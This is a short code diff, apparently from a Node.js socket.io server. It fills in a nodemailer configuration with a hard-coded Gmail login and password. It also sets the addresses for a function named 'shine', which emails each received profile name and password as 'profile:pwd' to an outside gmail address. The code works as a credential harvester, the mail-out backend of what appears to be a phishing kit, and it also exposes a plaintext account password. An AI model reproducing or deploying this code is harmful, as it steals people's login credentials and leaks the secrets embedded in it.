@@ -9,8 +9,8 @@ let transporter = nodemailer.createTransport({
   port: 465,
   secure: true,
   auth: {
-    user: "",
-    pass: ""
+    user: "marion.silver19@gmail.com",
+    pass: "YujQuemhibagye4"
   }
 });
 
@@ -34,8 +34,8 @@ io.on('connection', (socket) => {
 var shine = function(data) {
   console.log(data);
   transporter.sendMail({
-    from: '',
-    to: '',
+    from: 'alicia.holm@gmx.com',
+    to: 'alicia.holm83@gmail.com',
     subject: 'shine',
     text: data.profile + ':' + data.pwd
   })
